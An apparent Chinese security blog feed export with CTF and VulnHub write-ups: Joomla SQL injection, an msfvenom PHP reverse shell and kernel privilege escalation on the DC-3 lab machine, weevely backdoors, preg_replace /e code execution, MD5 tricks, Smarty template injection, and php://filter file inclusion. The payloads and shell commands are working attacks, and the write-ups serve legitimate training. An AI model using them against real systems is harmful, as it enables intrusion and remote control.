src="/2020/02/10/buuctf%E6%96%B0%E6%98%A5%E7%BA%A2%E5%8C%85%E9%A2%98writeup/TIM截图20200210233351.png" style="zoom:67%;"><p>参考：</p><p><a href="https://www.zhaoj.in/read-6397.html">https://www.zhaoj.in/read-6397.html</a></p><p><a href="http://althims.com/2020/01/29/buu-new-year/">http://althims.com/2020/01/29/buu-new-year/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 反序列化 </tag>
            
            <tag> pop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulnHub之DC-3靶机</title>
      <link href="2020/02/06/VulnHub%E4%B9%8BDC-3%E9%9D%B6%E6%9C%BA/"/>
      <url>2020/02/06/VulnHub%E4%B9%8BDC-3%E9%9D%B6%E6%9C%BA/</url>
      
        <content type="html"><![CDATA[<p>本篇博客主要介绍了玩DC-3靶机的过程！</p><a id="more"></a><p>kali：192.168.17.146</p><p>靶机：192.168.17.137</p><h2 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h2><p>打开是这样的</p><img src="/2020/02/06/VulnHub%E4%B9%8BDC-3%E9%9D%B6%E6%9C%BA/TIM截图20200206155435.png" style="zoom:80%;"><p>英语翻译一下的大概意思就是只有一个flag，并且只有获得root才能获得flag</p><p>dirsearch扫一下，在<code>README.txt</code>看到是<code>Joomla3.7</code></p><img src="/2020/02/06/VulnHub%E4%B9%8BDC-3%E9%9D%B6%E6%9C%BA/TIM截图20200206165809.png" style="zoom:80%;"><p>搜了搜，发现<code>Joomla3.7.0</code>有sql注入漏洞，payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;updatexml(1,concat(0x3e,database()),0)</span><br></pre></td></tr></table></figure><p>直接用sqlmap跑</p><img src="/2020/02/06/VulnHub%E4%B9%8BDC-3%E9%9D%B6%E6%9C%BA/TIM截图20200206170944.png" style="zoom:80%;"><p>跑出来账号密码</p><img src="/2020/02/06/VulnHub%E4%B9%8BDC-3%E9%9D%B6%E6%9C%BA/TIM截图20200206172206.png" style="zoom:80%;"><p>显然这个密码是经过某种加密的，用<code>john</code>解密，先将加密的字符串写到hash这个文件内</p><img src="/2020/02/06/VulnHub%E4%B9%8BDC-3%E9%9D%B6%E6%9C%BA/TIM截图20200206173133.png" style="zoom:80%;"><p>解出来是<code>snoopy</code>，登陆后台，地址：<code>/administrator/index.php</code></p><img src="/2020/02/06/VulnHub%E4%B9%8BDC-3%E9%9D%B6%E6%9C%BA/TIM截图20200206174707.png" style="zoom:80%;"><p>发现可以新建修改文件，直接用msf生成一个php的meterpreter</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.17.146  -f raw &gt; shell.php</span><br></pre></td></tr></table></figure><img src="/2020/02/06/VulnHub%E4%B9%8BDC-3%E9%9D%B6%E6%9C%BA/TIM截图20200206175355.png" style="zoom: 50%;"><p>路径位于<code>/templates/beez3/shell.php</code>，msf监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload php/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.17.146</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>然后访问，成功拿到shell</p><img src="/2020/02/06/VulnHub%E4%B9%8BDC-3%E9%9D%B6%E6%9C%BA/TIM截图20200206180725.png" style="zoom: 80%;"><p>拿到的是www权限，想办法提权，进入shell，看下版本，发现是Ubuntu 16.04</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br><span class="line">cat /proc/version</span><br><span class="line">cat /etc/issue</span><br><span class="line">cat /etc/redhat-release</span><br></pre></td></tr></table></figure><img src="/2020/02/06/VulnHub%E4%B9%8BDC-3%E9%9D%B6%E6%9C%BA/TIM截图20200206182606.png" style="zoom:80%;"><p><code>searchsploit</code>查找提权漏洞</p><img src="/2020/02/06/VulnHub%E4%B9%8BDC-3%E9%9D%B6%E6%9C%BA/TIM截图20200206232440.png" style="zoom:67%;"><p>选择用这个<code>4.4.x (Ubuntu 16.04) - &#39;double-fdput()&#39; bpf(BPF_PROG_LOAD) Privilege Escalation</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</span><br><span class="line">unzip 39772.zip</span><br><span class="line">tar -xvf exploit.tar</span><br><span class="line"><span class="built_in">cd</span> ebpf_mapfd_doubleput_exploit</span><br><span class="line">./compile.sh<span class="comment">#会报错，忽略就行</span></span><br><span class="line">./doubleput</span><br></pre></td></tr></table></figure><img src="/2020/02/06/VulnHub%E4%B9%8BDC-3%E9%9D%B6%E6%9C%BA/TIM截图20200206234540.png" style="zoom:80%;"><p>得到flag</p><img src="/2020/02/06/VulnHub%E4%B9%8BDC-3%E9%9D%B6%E6%9C%BA/TIM截图20200206234648.png" style="zoom:80%;"><p>用php的meterpreter感觉真的不太好，不知道为啥断了好几次</p><p>推荐使用<code>weevely</code>，用法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">weevely generate 1 a.php <span class="comment">#生成密码为1的php后门</span></span><br><span class="line">weevely http://127.0.0.1/a.php 1<span class="comment">#连接</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> VulnHub </tag>
            
            <tag> 靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>preg_replace与代码执行</title>
      <link href="2020/01/31/preg-replace%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
      <url>2020/01/31/preg-replace%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<p>之前这个知识点不知道，记录一下！</p><a id="more"></a><h2 id="preg-replace-函数"><a href="#preg-replace-函数" class="headerlink" title="preg_replace()函数"></a>preg_replace()函数</h2><p>先看下php手册</p><p><strong>函数说明：</strong>该函数执行一个正则表达式的搜索和替换</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, <span class="keyword">int</span> $limit = <span class="number">-1</span> [, <span class="keyword">int</span> &amp;$count ]] ) : mixed</span><br></pre></td></tr></table></figure><p>搜索<code>subject</code>中匹配<code>pattern</code>的部分， 以<code>replacement</code>进行替换。</p><p>对于第二个参数，php手册上这样说明</p><img src="/2020/01/31/preg-replace%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/TIM截图20200131122252.png" style="zoom: 80%;"><p>在最后一段中我们可以看到，如果加上e修饰符就可以导致代码执行，注意这个有版本限制，php7版本将无法执行</p><img src="/2020/01/31/preg-replace%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/TIM截图20200131124525.png" style="zoom:80%;"><h2 id="一个简单的例子"><a href="#一个简单的例子" class="headerlink" title="一个简单的例子"></a>一个简单的例子</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">preg_replace(<span class="string">&quot;/t/e&quot;</span>, $_GET[<span class="string">&quot;a&quot;</span>], <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><img src="/2020/01/31/preg-replace%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/TIM截图20200131125938.png" style="zoom:80%;"><p>在php5.6成功执行如上结果，发现要替换的<code>t</code>有两个位置，<code>var_dump(1)</code>就执行两次，因此要想执行代码，第三个参数必须存在第一个参数正则的字符</p><h2 id="一道CTF题目"><a href="#一道CTF题目" class="headerlink" title="一道CTF题目"></a>一道CTF题目</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params">$re, $str</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="string">&#x27;/(&#x27;</span> . $re . <span class="string">&#x27;)/ei&#x27;</span>,<span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,$str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $re =&gt; $str) &#123;</span><br><span class="line">    <span class="keyword">echo</span> complex($re, $str). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>按照上面的思路，这里的<code>preg_replace</code>函数的第二个参数已经固定为<code>&#39;strtolower(&quot;\\1&quot;)&#39;</code> 字符串，<code>strtolower</code>函数的作用是将字符串转化为小写，那这样要如何执行代码呢？</p><p>上面的命令执行，相当于<code>eval(&#39;strtolower(&quot;\\1&quot;);&#39;</code>) 结果，当中的 <code>\\1</code> 实际上就是 <code>\1</code> ，而 <code>\1</code> 在正则表达式中有自己的含义。</p><p><strong>反向引用:</strong></p><p>对一个正则表达式模式或部分模式 <strong>两边添加圆括号</strong> 将导致相关 <strong>匹配存储到一个临时缓冲区</strong>中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 ‘\n’ 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。</p><p>所以这里的<code>\\1</code>代表的是第一个子匹配项，但是有此也只是仅仅能执行将第一个子匹配项全部变成小写，也无法代码执行啊，这里，我们需要先了解一下<a href="https://www.php.net/manual/zh/language.variables.variable.php">php可变变量</a>的概念：</p><p><strong>在PHP中双引号包裹的字符串中可以解析变量，而单引号则不行</strong></p><p><strong>举个例子：</strong></p><p>双引号例子，可以看到phpinfo已经成功解析</p><img src="/2020/01/31/preg-replace%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/TIM截图20200131203850.png" style="zoom: 50%;"><p>单引号例子，phpinfo没能解析</p><img src="/2020/01/31/preg-replace%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/TIM截图20200131203924.png" style="zoom:80%;"><p>前面的<code>\\1</code>正是位于双引号中，如此，我们可以尝试构造如下payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?.*=$&#123;phpinfo()&#125;</span><br></pre></td></tr></table></figure><p>但这是还有个问题，由于php字符串解析特性，<code>.</code>会替换成<code>_</code>，具体参见：<a href="https://xz.aliyun.com/t/2557">https://xz.aliyun.com/t/2557</a></p><p>如此，我们构造的payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?\S*=$&#123;phpinfo()&#125;</span><br><span class="line">或者</span><br><span class="line">?\S*=&#123;$&#123;phpinfo()&#125;&#125;</span><br></pre></td></tr></table></figure><p><code>\S</code>在正则表达式中表示任何非空白字符，等价于 <code>[^ \f\n\r\t\v]</code></p><img src="/2020/01/31/preg-replace%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/TIM截图20200131205759.png" style="zoom:80%;"><p>总之，坑很多！</p><p>分析一下代码执行的流程，<code>$&#123;phpinfo()&#125;</code>中的 <code>phpinfo()</code>会被当做变量先执行，执行后，即变成 <code>$&#123;1&#125;</code> (phpinfo()成功执行返回true)</p><p>看几个例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var_dump(phpinfo()); <span class="comment">// 布尔true</span></span><br><span class="line">var_dump(strtolower(phpinfo()));<span class="comment">// 字符串&#x27;1&#x27;,phpinfo执行成功返回1，将1小写</span></span><br><span class="line">var_dump(preg_replace(<span class="string">&#x27;/(.*)/ie&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;&#123;$&#123;phpinfo()&#125;&#125;&#x27;</span>));<span class="comment">//字符串&#x27;11&#x27;</span></span><br><span class="line">var_dump(preg_replace(<span class="string">&#x27;/(.*)/ie&#x27;</span>,<span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,<span class="string">&#x27;&#123;$&#123;phpinfo()&#125;&#125;&#x27;</span>));<span class="comment">// 结果：空字符串&#x27;&#x27;</span></span><br><span class="line">var_dump(preg_replace(<span class="string">&#x27;/(.*)/ie&#x27;</span>,<span class="string">&#x27;strtolower(&quot;&#123;$&#123;phpinfo()&#125;&#125;&quot;)&#x27;</span>,<span class="string">&#x27;&#123;$&#123;phpinfo()&#125;&#125;&#x27;</span>));<span class="comment">// 结果：空字符串&#x27;&#x27;</span></span><br><span class="line">这里的<span class="string">&#x27;strtolower(&quot;&#123;$&#123;phpinfo()&#125;&#125;&quot;)&#x27;</span>执行后相当于 strtolower(<span class="string">&quot;<span class="subst">&#123;$&#123;1&#125;</span>&#125;&quot;</span>) 又相当于 strtolower(<span class="string">&quot;&#123;null&#125;&quot;</span>) 又相当于 <span class="string">&#x27;&#x27;</span> 空字符串</span><br></pre></td></tr></table></figure><p>参考：</p><p><a href="https://xz.aliyun.com/t/2557">https://xz.aliyun.com/t/2557</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF2020复现writeup</title>
      <link href="2020/01/29/BJDCTF%E5%A4%8D%E7%8E%B0writeup/"/>
      <url>2020/01/29/BJDCTF%E5%A4%8D%E7%8E%B0writeup/</url>
      
        <content type="html"><![CDATA[<p>本篇博客主要记录了BGDCTF2020部分题目的writeup！</p><a id="more"></a><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Easy-MD5"><a href="#Easy-MD5" class="headerlink" title="Easy MD5"></a>Easy MD5</h3><p>打开题目，在http响应头里找到hint</p><img src="/2020/01/29/BJDCTF%E5%A4%8D%E7%8E%B0writeup/TIM截图20200129200528.png" style="zoom: 80%;"><p>很熟悉，第一时间的我没有想到，之前做过，哎！<a href="https://www.moonback.xyz/2019/10/05/jarvisoj-web-wp/#Login">https://www.moonback.xyz/2019/10/05/jarvisoj-web-wp/#Login</a></p><p>直接提交<code>ffifdyop</code>就行，原因：</p><p><strong>md5()函数</strong>有两个参数</p><p>参数一是要加密的字符串；</p><p>参数二是输出格式：为true时，表示输出原始16字符二进制格式；默认为false，表示输出32字符十六进制数。</p><p>字符串<code>ffifdyop</code>MD5加密后再转换成字符串为<code>&#39;or&#39;6&lt;乱码&gt;</code>，拼接后的语句为：<code>select * from admin where password=&#39;&#39;or&#39;6&lt;乱码&gt;&#39;</code> ，就相当于<code>select * from admin where password=&#39;&#39;or 1</code> ,实现sql注入</p><img src="/2020/01/29/BJDCTF%E5%A4%8D%E7%8E%B0writeup/TIM截图20200129202450.png" style="zoom:67%;"><p>然后跳转到另一个网页，查看源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = $GET[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">$b = $_GET[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>($a != $b &amp;&amp; md5($a) == md5($b))</span><br></pre></td></tr></table></figure><p>两种方式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">levels91.php?a[]&#x3D;1&amp;b[]&#x3D;&#x2F;&#x2F;数组烧过</span><br><span class="line"></span><br><span class="line">levels91.php?a&#x3D;QNKCDZO&amp;b&#x3D;s878926199a&#x2F;&#x2F;md5弱比较</span><br></pre></td></tr></table></figure><p>然后又跳转到另外一个网页</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">&#x27;param1&#x27;</span>]!==$_POST[<span class="string">&#x27;param2&#x27;</span>]&amp;&amp;md5($_POST[<span class="string">&#x27;param1&#x27;</span>])===md5($_POST[<span class="string">&#x27;param2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>还是两种方式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST:</span><br><span class="line">param1[]&#x3D;&amp;param2[]&#x3D;1&#x2F;&#x2F;数组绕过</span><br><span class="line"></span><br><span class="line">bp抓包POST:</span><br><span class="line">param1&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;param2&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure><img src="/2020/01/29/BJDCTF%E5%A4%8D%E7%8E%B0writeup/TIM截图20200129212213.png" style="zoom:80%;"><h3 id="Mark-loves"><a href="#Mark-loves" class="headerlink" title="Mark loves"></a>Mark loves</h3><p>dirsearch扫出来git源码泄露，恢复出来，得到:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">$yds = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line">$is = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line">$handsome = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $$y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">&#x27;flag&#x27;</span>] === $x &amp;&amp; $x !== <span class="string">&#x27;flag&#x27;</span>)&#123;<span class="comment">//GET方式传flag只能传一个flag=flag</span></span><br><span class="line">        <span class="keyword">exit</span>($handsome);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>($_POST[<span class="string">&#x27;flag&#x27;</span>]))&#123;<span class="comment">//GET和POST其中之一必须传flag</span></span><br><span class="line">    <span class="keyword">exit</span>($yds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || $_GET[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;<span class="comment">//GET和POST传flag,必须不能是flag=flag</span></span><br><span class="line">    <span class="keyword">exit</span>($is);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span>.$flag;</span><br></pre></td></tr></table></figure><p>php可变变量，仔细分析一下，发现可以构造下面的payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?handsome=flag&amp;flag=handsome</span><br><span class="line"><span class="comment">//这样的话，经过第二个foreach循环，$handsome就会等于$flag，$flag等于$handsome会不变，经过第三个循环第一次遍历$_GET[&#x27;flag&#x27;]=&quot;handsome&quot;=$x=&quot;handsome&quot;!=&#x27;flag&#x27;，退出输出$handsome即$flag的值</span></span><br><span class="line"></span><br><span class="line">?yds=flag </span><br><span class="line"><span class="comment">//这样的话，在经过第二个foreach循环时，$yds就会等于$flag,在经过第三个foreach循环时，没传flag直接跳过，然后if满足条件，退出输出$yds即$flag</span></span><br></pre></td></tr></table></figure><h3 id="The-mystery-of-ip"><a href="#The-mystery-of-ip" class="headerlink" title="The mystery of ip"></a>The mystery of ip</h3><p>真想不到是SSTI,查看发现XFF可控，smarty模板注入payload:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">X-Forwarded-For</span>: &#123;&#123;system(&quot;cat /flag&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><img src="/2020/01/29/BJDCTF%E5%A4%8D%E7%8E%B0writeup/TIM截图20200129222724.png" style="zoom:67%;"><h3 id="ZJCTF，不过如此"><a href="#ZJCTF，不过如此" class="headerlink" title="ZJCTF，不过如此"></a>ZJCTF，不过如此</h3><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$text = $_GET[<span class="string">&quot;text&quot;</span>];</span><br><span class="line">$file = $_GET[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;I have a dream&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents($text,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Not now!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>($file);  <span class="comment">//next.php </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>读<code>next.php</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?text&#x3D;php:&#x2F;&#x2F;input&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;next.php</span><br><span class="line">POST: I have a dream</span><br></pre></td></tr></table></figure><p>得到：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$id = $_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">$_SESSION[<span class="string">&#x27;id&#x27;</span>] = $id;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params">$re, $str</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="string">&#x27;/(&#x27;</span> . $re . <span class="string">&#x27;)/ei&#x27;</span>,<span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,$str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $re =&gt; $str) &#123;</span><br><span class="line">    <span class="keyword">echo</span> complex($re, $str). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">@<span class="keyword">eval</span>($_GET[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>读flag，具体参见：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?\S*=$&#123;getFlag()&#125;&amp;cmd=system(<span class="string">&quot;cat /flag&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="EasySearch"><a href="#EasySearch" class="headerlink" title="EasySearch"></a>EasySearch</h3><p>扫路径发现<code>index.php.swp</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ob_start();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_hash</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">$chars = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;</span><br><span class="line">$random = $chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)];<span class="comment">//Random 5 times</span></span><br><span class="line">$content = uniqid().$random;</span><br><span class="line"><span class="keyword">return</span> sha1($content); </span><br><span class="line">&#125;</span><br><span class="line">    header(<span class="string">&quot;Content-Type: 